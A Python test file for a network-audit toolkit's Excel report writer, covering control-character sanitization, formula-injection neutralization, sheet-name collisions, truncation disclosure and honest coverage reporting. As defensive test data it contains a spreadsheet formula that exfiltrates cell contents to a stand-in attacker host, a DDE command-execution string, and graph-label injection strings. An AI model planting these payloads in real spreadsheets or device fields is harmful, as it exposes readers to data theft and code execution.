"""Workbook (excel.py) robustness — control-character sanitization at the cell-write chokepoint.

The workbook is the ONE deliverable produced unconditionally (there is no --no-excel). openpyxl raises
IllegalCharacterError on a control char (0x00-0x08, 0x0B-0x0C, 0x0E-0x1F), and device-derived free-text
(a CDP/LLDP neighbour name, an interface description, a banner) is read with errors='ignore', which passes
valid-UTF-8 control bytes through. A single one used to abort the entire workbook. harden_workbook() sanitizes
at the cell-write chokepoint so no device-text field can crash it -- one guard over all ~329 write sites.
"""
import io

import pytest

openpyxl = pytest.importorskip("openpyxl")
from openpyxl import Workbook, load_workbook  # noqa: E402

from cisco_toolkit.excel import _xls_sanitize, harden_workbook, write_endpoint_census_sheet  # noqa: E402
from cisco_toolkit.model import InterfaceData  # noqa: E402

_DIRTY = "EDGE-SW1\x07\x1b[31m desc\x0b end\x00"   # BEL + ESC-seq + VT + NUL embedded in a device string


def test_xls_sanitize_strips_control_chars_keeps_text():
    clean = _xls_sanitize(_DIRTY)
    assert "EDGE-SW1" in clean and "desc" in clean and "end" in clean   # real text preserved
    assert not any(ord(ch) < 0x20 and ch not in "\t\n\r" for ch in clean)  # no illegal control chars left
    assert _xls_sanitize(42) == 42 and _xls_sanitize(None) is None         # non-strings pass through


def test_xls_sanitize_neutralizes_leading_equals_formula_injection():
    """[audit-6 sec HIGH] xlsx formula injection: openpyxl writes a STRING cell whose first char is '=' as a
    LIVE formula (data_type='f'), so an attacker-influenced device field -- a hostname / interface
    description / CDP-LLDP neighbour / VLAN name set to =HYPERLINK("http://evil/"&A1,"click") or
    =cmd|'/c calc'!A1 (DDE) -- executes in the CLIENT's workbook on open. _xls_sanitize must force a
    leading-'=' string back to inert text with the apostrophe prefix."""
    assert _xls_sanitize('=HYPERLINK("http://evil/"&A1,"x")').startswith("'=")
    assert _xls_sanitize("=cmd|'/c calc'!A1") == "'=cmd|'/c calc'!A1"
    assert _xls_sanitize("=1+1") == "'=1+1"
    # idempotent: a value that arrives already-prefixed (append-wrap then the Cell.value setter both fire)
    # must NOT double-prefix -- "'=x" does not start with '=' so it is left alone
    assert _xls_sanitize("'=1+1") == "'=1+1"
    # '+','-','@' are stored by openpyxl as ordinary strings (NOT live formulas in the .xlsx) and are
    # legitimate leading chars in delta / placeholder / negative cells -> they must be LEFT ALONE (else
    # real deliverable content is corrupted on re-read).
    for legit in ("+3 added", "-2 removed", "-", "@handle", "EDGE-SW1", "10.0.0.1", ""):
        assert _xls_sanitize(legit) == legit, legit


def test_workbook_refuses_live_formula_from_device_string(tmp_path):
    """NON-VACUOUS end-to-end proof: a malicious hostname written through the real harden_workbook chokepoint
    -- via all three write paths (cell(value=), the direct Cell.value setter, and append) -- saved and
    RELOADED must NOT be a live formula cell. openpyxl marks a leading-'=' string as data_type='f' (verified:
    stock openpyxl writes 'f' for all three paths); the guard must yield data_type='s' (inert text). Removing
    the apostrophe-prefix in _xls_sanitize flips every cell back to 'f' -> the data_type assert fails (this
    test is not vacuous)."""
    payload = '=HYPERLINK("http://attacker.example/exfil?d="&A1,"Open report")'
    wb = harden_workbook(Workbook())
    ws = wb.active
    ws.cell(row=1, column=1, value=payload)          # ws.cell(value=) path
    ws["B1"] = payload                                # direct Cell.value-setter path
    ws.append([payload])                              # ws.append path
    out = tmp_path / "inj.xlsx"
    wb.save(str(out))
    ws2 = load_workbook(str(out)).active
    for addr in ("A1", "B1", "A2"):
        c = ws2[addr]
        assert c.data_type != "f", f"{addr} is a LIVE formula cell (data_type={c.data_type!r}) -- injection"
        assert c.data_type == "s" and str(c.value).startswith("'=")   # inert text, apostrophe-forced
        assert "attacker.example" in str(c.value)                     # payload text preserved, just not live


def test_harden_workbook_sanitizes_cell_and_append_no_raise():
    wb = harden_workbook(Workbook())
    ws = wb.create_sheet("t")          # created AFTER harden -> still wrapped via create_sheet
    ws.cell(row=1, column=1, value=_DIRTY)         # kwargs form
    ws.cell(2, 1, _DIRTY)                           # positional form
    ws.append([_DIRTY, "ok", 7])                    # append form
    buf = io.BytesIO()
    wb.save(buf)                                    # must NOT raise IllegalCharacterError
    assert buf.tell() > 0
    for addr in ("A1", "A2", "A3"):
        assert "\x07" not in ws[addr].value and "\x1b" not in ws[addr].value


def test_endpoint_census_sheet_survives_control_char_in_device_text(tmp_path):
    """End-to-end on a real sheet writer: a control char in a device field (CDP neighbour, location) must not
    abort the workbook; it saves and the dirty text is sanitized in the written cell."""
    wb = harden_workbook(Workbook())
    d = InterfaceData(port="Gi1/0/1", vlan="10", vlan_name="DATA", end_host_mac="00:11:22:33:44:55",
                      end_host_ip="10.0.10.5", cdp_neighbor=_DIRTY, endpoint_location="rack\x0b3")
    write_endpoint_census_sheet(wb, {"SW1": {"Gi1/0/1": d}})   # must not raise
    out = tmp_path / "wb.xlsx"
    wb.save(str(out))
    assert out.exists() and out.stat().st_size > 0
    wb2 = load_workbook(str(out))
    vals = [c.value for row in wb2[wb2.sheetnames[-1]].iter_rows()
            for c in row if isinstance(c.value, str)]
    assert any("EDGE-SW1" in v for v in vals)                       # neighbour text survived
    assert not any("\x07" in v or "\x1b" in v or "\x0b" in v for v in vals)   # control chars gone


def test_append_interface_rows_survives_control_char_no_silent_port_drop(tmp_path):
    """EXCEL-01 (silent data loss): append_interface_rows writes device text via DIRECT `cell.value = val`
    (not ws.cell(value=...)), so a control char in ONE port's description raised IllegalCharacterError mid-loop;
    _run_phase (per host) swallowed it, and every port written AFTER the offending one was silently dropped from
    the customer-facing interface census. The Cell.value-setter guard installed by harden_workbook must keep ALL
    four ports (the bug landed only 2)."""
    from openpyxl import Workbook
    from cisco_toolkit.excel import append_interface_rows
    from cisco_toolkit.model import InterfaceData

    def mk(p, desc):
        d = InterfaceData(); d.port = p; d.status = "connected"; d.description = desc; return d
    ifaces = {"Gi1/0/1": mk("Gi1/0/1", "one"),
              "Gi1/0/2": mk("Gi1/0/2", "uplink \x1b[0m core"),   # control char mid-loop
              "Gi1/0/3": mk("Gi1/0/3", "three"),
              "Gi1/0/4": mk("Gi1/0/4", "four")}
    wb = harden_workbook(Workbook())
    ws = wb.active
    col_map = {"hostname": 1, "port": 2, "status": 3, "description": 4}
    for h, c in col_map.items():
        ws.cell(row=1, column=c, value=h)
    append_interface_rows(ws, 1, col_map, "SW1", ifaces)          # must NOT raise nor drop the tail
    ports = [ws.cell(r, 2).value for r in range(2, ws.max_row + 1) if ws.cell(r, 2).value]
    assert set(ports) == {"Gi1/0/1", "Gi1/0/2", "Gi1/0/3", "Gi1/0/4"}, ports
    wb.save(str(tmp_path / "if.xlsx"))


def test_framework_coverage_sheet_renders_and_is_coverage_honest(tmp_path):
    """[W2-3 workbook] The Framework Coverage sheet surfaces the CIS/NIST/PCI/STIG compliance matrix in the PRIMARY
    deliverable. It must (1) render a failing control with its framework, control id, engine check + failing hosts;
    (2) DISCLOSE the coverage-honesty caveat ('NOT a full framework audit'); (3) NOT silently drop a framework that
    auto-assessed zero controls -- an empty framework reads as a fake 'all clear' unless it is explicitly disclosed
    as 0-controls-assessed. The render is tested in isolation from compute_framework_coverage (already tested)."""
    from cisco_toolkit.excel import harden_workbook, write_framework_coverage_sheet, FRAMEWORK_COVERAGE_SHEET_NAME
    fc = {
        "frameworks": {
            "CIS": {"label": "CIS Cisco Benchmark", "controls": [
                {"control": "CIS 1.2.1", "check": "weak-enable", "title": "Enable secret is weak",
                 "status": "fail", "n_fail": 2, "hosts_fail": ["R1", "R2"]},
                {"control": "CIS 6.1", "check": "no-ntp", "title": "NTP not configured",
                 "status": "pass", "n_fail": 0, "hosts_fail": []}],
                "n_assessed": 2, "n_fail": 1},
            "NIST": {"label": "NIST 800-53 r5", "controls": [
                {"control": "IA-5", "check": "weak-enable", "title": "Enable secret is weak",
                 "status": "fail", "n_fail": 2, "hosts_fail": ["R1", "R2"]}], "n_assessed": 1, "n_fail": 1},
            "PCI": {"label": "PCI-DSS v4.0", "controls": [], "n_assessed": 0, "n_fail": 0},   # empty -> must be disclosed
            "STIG": {"label": "DISA Cisco NDM STIG", "controls": [], "n_assessed": 0, "n_fail": 0},
        },
        "note": "Config-evidenced mapping of the engine's hardening checks to framework controls — NOT a full "
                "framework audit. Controls outside this check set are not auto-assessed (never assumed 'pass').",
        "scope": "config-only (show running-config); management-plane hardening controls",
    }
    wb = harden_workbook(Workbook())
    write_framework_coverage_sheet(wb, fc)
    out = tmp_path / "fc.xlsx"
    wb.save(str(out))
    wb2 = load_workbook(str(out))
    assert FRAMEWORK_COVERAGE_SHEET_NAME in wb2.sheetnames
    cells = [c.value for row in wb2[FRAMEWORK_COVERAGE_SHEET_NAME].iter_rows()
             for c in row if isinstance(c.value, str)]
    joined = "\n".join(cells)
    assert "CIS 1.2.1" in joined and "weak-enable" in joined        # (1) the failing control rendered
    assert any("FAIL" == v for v in cells)                          # explicit FAIL status cell
    assert "R1" in joined and "R2" in joined                        # failing hosts surfaced (grounding)
    assert "NIST 800-53 r5" in joined                               # the framework label
    assert "NOT a full framework audit" in joined                   # (2) coverage-honesty disclosed
    assert "PCI-DSS v4.0" in joined and "DISA Cisco NDM STIG" in joined   # (3) empty frameworks NOT dropped
    # NON-VACUITY (mutation-proved, 2026-07-28): the old form was
    #   `"0 control" in joined.lower() or "not auto-assessed" in joined.lower()`
    # and the SECOND disjunct is satisfied by the fixture's own `note`, which this sheet writes
    # verbatim into A1 ("...are not auto-assessed (never assumed 'pass')"). The assertion therefore
    # restated its own input: deleting the writer's per-framework 0-controls cell entirely — so PCI
    # and STIG render as a bare label plus em-dashes, the fake all-clear claim (3) names — left
    # BOTH this test and the whole of test_excel.py GREEN. Assert the writer's own string, on the
    # empty frameworks' own ROWS.
    empty_rows = [[c.value for c in row]
                  for row in wb2[FRAMEWORK_COVERAGE_SHEET_NAME].iter_rows()
                  if row and row[0].value in ("PCI-DSS v4.0", "DISA Cisco NDM STIG")]
    assert len(empty_rows) == 2, f"an auto-assessed-zero framework was dropped: {empty_rows}"
    for row in empty_rows:
        disclosure = " ".join(str(v) for v in row if isinstance(v, str))
        assert "0 controls auto-assessed" in disclosure, (
            f"{row[0]!r} renders with no 0-controls disclosure — it reads as a clean framework "
            f"that was never assessed: {row}")


# =============================================================================
# Review 2026-07-28 tranche — excel.py findings #18 #55 #63 #64 #86 #87 #88.
# =============================================================================

def _iface(port, **kw):
    d = InterfaceData()
    d.port = port
    for k, v in kw.items():
        setattr(d, k, v)
    return d


def test_physical_health_never_stamps_ok_when_counters_were_not_collected(tmp_path):
    """[review #18] `show interfaces` is NOT an essential command and `_load_cmd_output` is an exact-match
    lookup, so `counters` is routinely {} for a whole device. The error-rate check then cannot fire and the
    row printed blank error counters plus the word 'ok' -- byte-identical to a genuinely clean port -- while
    Collection Completeness still tiered the device 'complete'. Absence of evidence is never health
    (excel.py's own rule, stated in write_coverage_schema_sheet).

    Non-vacuous by construction: the SAME port with the SAME essential evidence, differing only in whether
    the counters capture exists, must NOT produce the same verdict. A down port is the control: its
    error-rate check is inapplicable rather than unevaluated, so it legitimately still reads 'ok'."""
    from cisco_toolkit.excel import HEALTH_NOT_OBSERVED, write_physical_health_sheet

    ifaces = {"SW1": {"Gi1/0/1": _iface("Gi1/0/1", status="connected", switchport_mode="access"),
                      "Gi1/0/9": _iface("Gi1/0/9", status="notconnect", switchport_mode="access")}}

    wb = harden_workbook(Workbook())
    blind = {r["port"]: r for r in write_physical_health_sheet(wb, ifaces, {"SW1": {}}, [])}
    assert blind["Gi1/0/1"]["risk"].startswith(HEALTH_NOT_OBSERVED), blind["Gi1/0/1"]["risk"]
    assert "show interfaces" in blind["Gi1/0/1"]["risk"]          # names the missing evidence
    assert blind["Gi1/0/9"]["risk"] == "ok"                       # down port: check inapplicable, not unseen

    # the counters DO exist -> the port really was assessed -> 'ok' is a grounded claim
    cap = tmp_path / "show interfaces.txt"
    cap.write_text("GigabitEthernet1/0/1 is up, line protocol is up\n"
                   "  0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored\n"
                   "  Total output drops: 0\n", encoding="utf-8")
    wb2 = harden_workbook(Workbook())
    seen = {r["port"]: r for r in
            write_physical_health_sheet(wb2, ifaces, {"SW1": {"show interfaces": str(cap)}}, [])}
    assert seen["Gi1/0/1"]["risk"] == "ok", seen["Gi1/0/1"]
    assert seen["Gi1/0/1"]["input_errors"] == 0                   # the evidence behind that 'ok'


def test_l3_forwarding_never_stamps_ok_when_show_track_was_not_collected():
    """[review #18, same class] Without a `show track` capture the tracked-object-down check cannot fire,
    so a bare 'ok' in L3 Risk asserted a clean tracking state nobody looked at -- and the Tracking cell
    rendered the same blank for 'collected, none configured' as for 'never collected'."""
    from cisco_toolkit.excel import HEALTH_NOT_OBSERVED, write_l3_forwarding_sheet

    svi = dict(svi_ip="10.0.10.2 255.255.255.0", hsrp_behavior="HSRP grp 1 Active VIP 10.0.10.1",
               subnet_primary_route="10.0.10.0/24")
    ifaces = {"CORE1": {"Vlan10": _iface("Vlan10", **svi)},
              "CORE2": {"Vlan10": _iface("Vlan10", **dict(svi, hsrp_behavior="HSRP grp 1 Standby "
                                                                             "VIP 10.0.10.1"))}}
    wb = harden_workbook(Workbook())
    rows = write_l3_forwarding_sheet(wb, ifaces, {})               # no captures at all
    assert rows and all(r["risk"].startswith(HEALTH_NOT_OBSERVED) for r in rows), rows
    assert all("show track" in r["risk"] for r in rows)
    assert all(r["tracking"] == HEALTH_NOT_OBSERVED for r in rows)  # blind spot, not a blank


def test_capacity_keeps_an_observed_zero_apart_from_never_observed():
    """[review #55] compute_capacity's own comment keeps `active_ports is None` (NOT observed) apart from a
    real 0, then `active or ""` threw it away -- emitting the blank the docstring reserves for unknown while
    the SAME row still carried a computed 0.0% utilisation and free_ports == total_ports. Two contradictory
    coverage claims in one row of the sheet consolidation decisions are made on."""
    from cisco_toolkit.excel import compute_capacity
    from cisco_toolkit.model import DevicePhysical

    def dp(host, total, active):
        d = DevicePhysical(hostname=host)
        d.model = "C9300-48P"
        d.total_ports = total
        d.active_ports = active
        return d

    out = {r["hostname"]: r for r in compute_capacity([dp("ZERO", 48, 0), dp("UNKNOWN", 48, None)])}
    # an OBSERVED zero is a fact: it renders as 0 and agrees with the util/free it is derived from
    assert out["ZERO"]["active_ports"] == 0
    assert out["ZERO"]["port_util"] == 0.0 and out["ZERO"]["free_ports"] == 48
    # NOT observed stays blank on ALL THREE derived fields (no fabricated headroom ranking)
    assert out["UNKNOWN"]["active_ports"] == ""
    assert out["UNKNOWN"]["port_util"] == "" and out["UNKNOWN"]["free_ports"] == ""


def test_xls_sanitize_neutralizes_a_whitespace_prefixed_formula():
    """[review #63] textutils.xml_safe deliberately PRESERVES tab (0x09), LF (0x0A) and CR (0x0D) as
    XML-legal, so a device description of "\\t=cmd|'/c calc'!A1" slipped both the old `startswith("=")`
    guard and openpyxl's identical formula detection -- and on the routine xlsx->CSV re-export the field
    lands as a leading-tab formula, which Excel / LibreOffice strip-then-evaluate. The '+'/'-'/'@'
    pass-through pinned above is UNCHANGED: those are stored as ordinary strings and are legitimate
    leading chars in real deliverable content."""
    for ws_ in ("\t", "\r", "\n", " ", " \t "):
        payload = ws_ + "=cmd|'/c calc'!A1"
        assert _xls_sanitize(payload) == "'" + payload, repr(payload)
    assert _xls_sanitize("\t=1+1").startswith("'")
    assert _xls_sanitize("'\t=1+1") == "'\t=1+1"          # idempotent: already-prefixed is left alone
    assert _xls_sanitize("\tGi1/0/1 uplink") == "\tGi1/0/1 uplink"   # ordinary tabbed text untouched
    assert _xls_sanitize("\t+3 added") == "\t+3 added"               # the pinned pass-through still holds


def test_sheet_writer_hardens_its_own_sheet_without_harden_workbook(tmp_path):
    """[review #63, structural] Every `write_*` is a PUBLIC entry point taking a caller-built workbook, but
    the sanitization guard lived only in harden_workbook(), which no writer called or asserted -- a caller
    that skipped it silently lost both the formula neutralisation and the control-char protection with no
    signal. Creating the sheet through _new_sheet installs both. (The Cell.value setter guard is
    process-wide and idempotent, so once ANY test installs it the functional assert alone would pass in a
    full-suite run; the marker assert is what actually pins the structural fix.)"""
    from cisco_toolkit.excel import FINDINGS_SHEET_NAME, write_findings_sheet

    wb = Workbook()                                  # deliberately NOT harden_workbook()
    write_findings_sheet(wb, {"SW1": {"Gi1/0/1": _iface("Gi1/0/1", description=_DIRTY)}})
    ws = wb[FINDINGS_SHEET_NAME]
    assert getattr(ws, "_cisco_hardened", False) is True     # the writer hardened its own sheet
    ws.cell(row=50, column=1, value=_DIRTY)                  # and the wrap is live on it
    ws.append([_DIRTY])
    wb.save(str(tmp_path / "unhardened.xlsx"))               # must not raise IllegalCharacterError
    assert "\x07" not in ws.cell(row=50, column=1).value


def test_sheet_writers_replace_a_colliding_template_sheet(tmp_path):
    """[review #86] The workbook is built on a CUSTOMER-SUPPLIED template. `wb.create_sheet(NAME)` against a
    tab the customer already named NAME does not raise or warn -- openpyxl renames the ENGINE's sheet to
    'NAME1', leaving the customer's stale tab holding the canonical name. ~28 writers had no delete-if-exists
    guard; the ~20 that did were the accident. Every writer is also non-idempotent without it."""
    from cisco_toolkit.excel import (CROSS_LAYER_SHEET_NAME, EXEC_SUMMARY_SHEET_NAME,
                                     write_cross_layer_sheet, write_executive_summary_sheet)

    wb = harden_workbook(Workbook())
    wb.active.title = CROSS_LAYER_SHEET_NAME
    wb[CROSS_LAYER_SHEET_NAME]["A1"] = "CUSTOMER'S STALE TAB"
    write_cross_layer_sheet(wb, [{"id": "CL-01", "severity": "High", "layers": "L1/L2",
                                  "title": "t", "detail": "d", "recommendation": "r"}])
    assert wb.sheetnames.count(CROSS_LAYER_SHEET_NAME) == 1
    assert CROSS_LAYER_SHEET_NAME + "1" not in wb.sheetnames
    assert wb[CROSS_LAYER_SHEET_NAME]["A1"].value == "CL"          # the ENGINE's header, not the stale tab
    write_cross_layer_sheet(wb, [])                                 # idempotent on a second invocation
    assert wb.sheetnames.count(CROSS_LAYER_SHEET_NAME) == 1

    # the worst instance: the customer's tab kept the name and the DUPLICATE was moved to position 0
    wb2 = harden_workbook(Workbook())
    wb2.active.title = EXEC_SUMMARY_SHEET_NAME
    wb2[EXEC_SUMMARY_SHEET_NAME]["A1"] = "CUSTOMER'S STALE TAB"
    write_executive_summary_sheet(wb2, [], [], [], [])
    assert wb2.sheetnames.count(EXEC_SUMMARY_SHEET_NAME) == 1
    assert wb2.sheetnames[0] == EXEC_SUMMARY_SHEET_NAME
    assert "STALE" not in str(wb2[EXEC_SUMMARY_SHEET_NAME]["A1"].value)


def test_oversized_cell_is_bounded_and_discloses_the_truncation(tmp_path):
    """[review #87] Nothing guarded Excel's 32,767-char cell limit; openpyxl's check_string does
    `value = value[:32767]` with NO exception and NO warning, so the remediation plan's `"\\n".join(commands)`
    -- the actual configuration an engineer is meant to review and apply -- was amputated mid-line in a
    workbook that still reported success. Where this module bounds a join it DISCLOSES it (the
    subnet-reachability '(+N)' pattern); the cap now does the same at the one write chokepoint."""
    from cisco_toolkit.excel import (REMEDIATION_PLAN_SHEET_NAME, _XLSX_MAX_CELL,
                                     write_remediation_plan_sheet)

    commands = [f"interface GigabitEthernet1/0/{i}\n spanning-tree bpduguard enable" for i in range(1200)]
    rp = {"items": [{"device": "SW1", "platform": "ios", "category": "STP", "severity": "High",
                     "title": "Enable BPDU guard", "commands": commands,
                     "verify": "show spanning-tree summary", "caution": "maintenance window"}],
          "summary": {"n_items": 1, "n_devices": 1, "n_high": 1, "by_category": {"STP": 1}}}
    wb = harden_workbook(Workbook())
    write_remediation_plan_sheet(wb, rp)
    out = tmp_path / "rp.xlsx"
    wb.save(str(out))

    cell = load_workbook(str(out))[REMEDIATION_PLAN_SHEET_NAME].cell(row=5, column=7).value
    assert len("\n".join(commands)) > _XLSX_MAX_CELL                # the input really does overflow
    assert len(cell) <= _XLSX_MAX_CELL                              # bounded
    assert "TRUNCATED" in cell and str(_XLSX_MAX_CELL) in cell.replace(",", "")   # and DISCLOSED
    assert cell.startswith("interface GigabitEthernet1/0/0")        # content preserved up to the cut


def test_topology_diagram_escapes_device_advertised_neighbour_names(tmp_path):
    """[review #64] analyze.compute_topology_links keeps the RAW advertised name for any off-scan CDP/LLDP
    neighbour, so a_host / b_host / b_port are fully DEVICE-CONTROLLED -- and these files are written with a
    plain open()/write(), so neither _xls_sanitize nor xml_safe runs. A quote terminated the DOT label early
    and a newline injected whole statements into both the .mmd and the .dot, while the writer logged [OK]."""
    from cisco_toolkit.excel import write_topology_diagram

    hostile_host = 'CORE1" [label="PWNED", color=red]; "junk'
    hostile_port = 'EVIL\nnode [shape=plaintext];\nrogue -- rogue2'
    ifaces = {"SW1": {"Gi1/0/1": _iface("Gi1/0/1", cdp_neighbor=hostile_host,
                                        neighbor_port=hostile_port, endpoint_type="Switch")}}
    mmd, dot = write_topology_diagram(ifaces, str(tmp_path / "topo"))
    mm_txt = open(mmd, encoding="utf-8").read()
    dot_txt = open(dot, encoding="utf-8").read()

    # 1. no statement injection: the embedded newlines cannot add lines to either file
    assert len([ln for ln in mm_txt.splitlines() if ln.strip()]) == 4    # 'graph LR', 2 nodes, 1 edge
    assert len([ln for ln in dot_txt.splitlines() if ln.strip()]) == 5   # open, 2 attrs, 1 edge, close

    # 2. DOT: every quote inside a label is backslash-escaped, so the device text stays INSIDE the
    #    quoted strings. Tokenise the edge line and keep only what falls OUTSIDE them -- that residue is
    #    the part Graphviz parses as syntax, and none of the payload may reach it.
    def _outside_dot(line):
        out, in_str, esc = [], False, False
        for ch in line:
            if esc:
                esc = False
            elif ch == "\\" and in_str:
                esc = True
            elif ch == '"':
                in_str = not in_str
            elif not in_str:
                out.append(ch)
        assert not in_str, f"unterminated DOT string: {line}"
        return "".join(out)

    edge = [ln for ln in dot_txt.splitlines() if " -- " in ln][0]
    residue = _outside_dot(edge)
    assert residue.count(";") == 1, residue             # exactly ONE statement terminator
    assert "PWNED" not in residue and "shape=plaintext" not in residue, residue
    assert "PWNED" in edge and '\\"' in edge            # payload preserved inside the label, escaped

    # 3. Mermaid: no raw quote / bracket / pipe survives into a label (entity-escaped instead)
    for ln in mm_txt.splitlines()[1:]:
        if '["' in ln:                                   # node declaration:  nN["label"]
            inner = ln[ln.index('["') + 2:ln.rindex('"]')]
        else:                                            # edge:  nA -.-|"label"| nB
            parts = ln.split("|")
            assert len(parts) == 3, ln                   # '|' cannot close the label early
            assert parts[1].startswith('"') and parts[1].endswith('"'), ln
            inner = parts[1][1:-1]
        assert '"' not in inner and "[" not in inner and "]" not in inner, inner
    assert "#quot;" in mm_txt and 'label="PWNED"' not in mm_txt


def test_append_interface_rows_never_presents_a_previous_runs_value_as_current(tmp_path):
    """[review #88] The w() helper was `cell.value = val if val else (cell.value or None)`, so a field this
    run observed NOTHING for silently kept the PREVIOUS run's value -- while Hostname/Port/Status were
    overwritten unconditionally. The function is explicitly designed to MATCH pre-existing rows, so
    re-running against a filled template is the normal path: it produced rows whose Status was fresh and
    whose VLAN / BPDU-guard were historical, rendered identically. Human-owned columns are the deliberate
    exception -- the engine never collects them, so a blank there is not a coverage claim."""
    from cisco_toolkit.excel import append_interface_rows

    col_map = {"hostname": 1, "port": 2, "status": 3, "vlan": 4, "trunk_native_vlan": 5,
               "stp_bpduguard": 6, "description": 7, "system_owner": 8, "endpoint_location": 9}
    wb = harden_workbook(Workbook())
    ws = wb.active
    for h, c in col_map.items():
        ws.cell(row=1, column=c, value=h)

    first = _iface("Gi1/0/1", status="connected", vlan="10", trunk_native_vlan="99",
                   stp_bpduguard="Enable", description="LAB-PRINTER",
                   system_owner="Facilities", endpoint_location="RACK-B12")
    append_interface_rows(ws, 1, col_map, "SW1", {"Gi1/0/1": first})
    assert [ws.cell(2, c).value for c in range(1, 10)] == [
        "SW1", "Gi1/0/1", "connected", "10", "99", "Enable", "LAB-PRINTER", "Facilities", "RACK-B12"]

    # a re-run that observed only the essential status: every DEVICE-derived column must clear
    second = _iface("Gi1/0/1", status="notconnect")
    append_interface_rows(ws, 1, col_map, "SW1", {"Gi1/0/1": second})
    row = [ws.cell(2, c).value for c in range(1, 10)]
    assert row[:3] == ["SW1", "Gi1/0/1", "notconnect"]          # fresh, as before
    assert row[3:7] == [None, None, None, None], row            # NOT last run's VLAN / native / BPDU / desc
    assert row[7:] == ["Facilities", "RACK-B12"], row           # the engineer's annotations survive
    wb.save(str(tmp_path / "iface.xlsx"))


# =============================================================================
# Round-2 deep pass (XL2). The first review of this 4,300-line file was capped at 8 candidates, so
# several of its fixes landed on ONE of the exits that emit the same claim. These pin the residue.
# =============================================================================

def test_switch_inventory_keeps_an_observed_zero_apart_from_never_observed(tmp_path):
    """[XL2-1, review #55 second exit] `active_ports` is `int | None`: None = the up/down state was never
    observed, 0 = an OBSERVED fact (every port down). The Capacity sheet was fixed to keep them apart;
    the Switch Inventory sheet's blanket `if val == 0: val = ""` still collapsed both into one blank, so
    the SAME workbook rendered the same field two contradictory ways. The blanket rule stays right for
    the int fields that have no None state (# Modules / Total Ports / # Power Supplies): 0 there IS the
    not-observed marker."""
    from cisco_toolkit.excel import (INVENTORY_SHEET_NAME, write_capacity_sheet,
                                     write_device_inventory_sheet)
    from cisco_toolkit.model import DevicePhysical

    dps = [DevicePhysical(hostname="OBSERVED-ZERO", total_ports=48, active_ports=0),
           DevicePhysical(hostname="NOT-OBSERVED", total_ports=48, active_ports=None)]
    wb = harden_workbook(Workbook())
    write_device_inventory_sheet(wb, dps)
    write_capacity_sheet(wb, dps)                      # the sheet whose rendering it must agree with
    p = tmp_path / "inv.xlsx"
    wb.save(str(p))
    ws = load_workbook(str(p))[INVENTORY_SHEET_NAME]
    hdr = [c.value for c in ws[1]]
    col = hdr.index("Active Ports") + 1
    rows = {ws.cell(r, 1).value: ws.cell(r, col).value for r in (2, 3)}
    assert rows["OBSERVED-ZERO"] == 0, rows            # a fact, not a blank
    assert rows["NOT-OBSERVED"] is None, rows          # the not-observed blank stays a blank
    # and the two sheets of one workbook now say the same thing about the same field
    cap = load_workbook(str(p))["Capacity"]
    ccol = [c.value for c in cap[1]].index("Active Ports") + 1
    capv = {cap.cell(r, 1).value: cap.cell(r, ccol).value for r in (2, 3)}
    assert capv["OBSERVED-ZERO"] == rows["OBSERVED-ZERO"] and capv["NOT-OBSERVED"] == rows["NOT-OBSERVED"]
    # the fields whose 0 really IS the not-observed marker keep the blanket blank
    assert ws.cell(2, hdr.index("# Modules") + 1).value is None


def test_sheet_collision_guard_folds_case_like_openpyxl_and_excel(tmp_path):
    """[XL2-2, review #86 residue] The delete-if-exists guard matched EXACT case, but openpyxl's own dedupe
    (`utils.avoid_duplicate_name`) folds case and so does Excel -- a workbook cannot hold both 'Findings'
    and 'FINDINGS'. So a customer template tab named 'FINDINGS' slipped the guard, openpyxl renamed the
    ENGINE's sheet to 'Findings1' anyway, and #86 reopened on exactly the input it was written for (a
    customer-supplied template, where tab casing is arbitrary)."""
    from cisco_toolkit.excel import (EXEC_SUMMARY_SHEET_NAME, FINDINGS_SHEET_NAME,
                                     write_executive_summary_sheet, write_findings_sheet)

    for tab in ("FINDINGS", "findings", "FiNdInGs"):
        wb = harden_workbook(Workbook())
        wb.active.title = tab
        wb[tab]["A1"] = "CUSTOMER STALE TAB"
        write_findings_sheet(wb, {})
        assert wb.sheetnames == [FINDINGS_SHEET_NAME], (tab, wb.sheetnames)
        assert wb[FINDINGS_SHEET_NAME]["A1"].value == "Severity"      # the ENGINE's header, not the tab

    # the worst instance: the exec summary then move_sheet()s the MIS-NAMED duplicate to position 0 while
    # the customer's stale tab keeps the canonical name.
    wb2 = harden_workbook(Workbook())
    wb2.active.title = "executive summary"
    wb2["executive summary"]["A1"] = "CUSTOMER STALE TAB"
    write_executive_summary_sheet(wb2, [], [], [], [])
    assert wb2.sheetnames == [EXEC_SUMMARY_SHEET_NAME], wb2.sheetnames
    p = tmp_path / "case.xlsx"
    wb2.save(str(p))
    assert "STALE" not in str(load_workbook(str(p))[EXEC_SUMMARY_SHEET_NAME]["A1"].value)


def test_link_duplex_speed_discloses_what_it_could_not_compare(tmp_path):
    """[XL2-3, audit-5 #6 second exit] 'Link Duplex-Speed' and 'Trunk Native-VLAN' compare the TWO ENDS of
    a CDP/LLDP link, so both can only see links whose far end was also collected. The coverage disclosure
    was added to the native-VLAN sheet and not to its twin, which kept printing a bare
    'clean / No duplex/speed mismatches on inter-switch links'. On an access-only collection -- every
    uplink landing on an uncollected core -- that is a definitive fleet-wide all-clear over ZERO
    comparisons."""
    from cisco_toolkit.excel import write_link_phy_sheet, write_trunk_native_sheet

    def up(port, nbr, nbr_port, **kw):
        return _iface(port, cdp_neighbor=nbr, neighbor_port=nbr_port, endpoint_type="Switch",
                      switchport_mode="Trunk", **kw)

    # two observed uplinks, both to an UNCOLLECTED core -> nothing is comparable
    blind = {"ACC-1": {"Gi1/0/49": up("Gi1/0/49", "CORE-1", "Gi1/1", duplex="full", speed="1000")},
             "ACC-2": {"Gi1/0/49": up("Gi1/0/49", "CORE-1", "Gi1/2", duplex="half", speed="1000")}}
    wb = harden_workbook(Workbook())
    write_link_phy_sheet(wb, blind)
    write_trunk_native_sheet(wb, blind)
    p = tmp_path / "blind.xlsx"
    wb.save(str(p))
    got = load_workbook(str(p))["Link Duplex-Speed"].cell(2, 2).value
    assert "0 inter-switch link(s) with both ends collected were compared" in got, got
    assert "2 of 2 observed link(s) had an uncollected far end" in got, got
    assert "not a fleet-wide guarantee" in got, got
    # the twin still says the same thing about the same population (one owner, no drift)
    twin = load_workbook(str(p))["Trunk Native-VLAN"].cell(2, 2).value
    assert "0 inter-switch link(s) with both ends collected were compared" in twin, twin

    # a REAL mismatch (both ends collected): the rows are there AND the coverage line still follows --
    # a reader looking at findings most needs to know what the check could not see.
